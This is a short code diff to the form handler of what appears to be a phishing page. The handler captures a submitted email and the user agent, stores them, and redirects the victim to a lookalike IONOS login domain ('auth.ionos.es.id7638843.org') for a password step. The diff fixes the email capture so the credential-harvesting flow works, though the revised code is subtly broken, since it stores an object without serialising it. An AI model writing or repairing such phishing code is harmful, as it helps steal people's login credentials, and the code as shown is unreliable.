@@ -265,13 +265,13 @@
 		let formData = new FormData(e.target);
 
 			
-		formData = JSON.stringify({
+		const payload = {
 			agent: userAgent,
-			email: formData.email,
+			email: formData.get('email'), // ✅ corect
 			try: 3
-		});
+		};
 
-		localStorage.setItem('usr', formData);
+		localStorage.setItem('usr', payload);
 	
 		window.location.href = 'https://auth.ionos.es.id7638843.org/pass.html?shoplogin=enabled&_gl=1*t2x778*_gcl_au*NzM2ODQ0NDYzLjE3Nzc3MzUyNTk.';
   })  
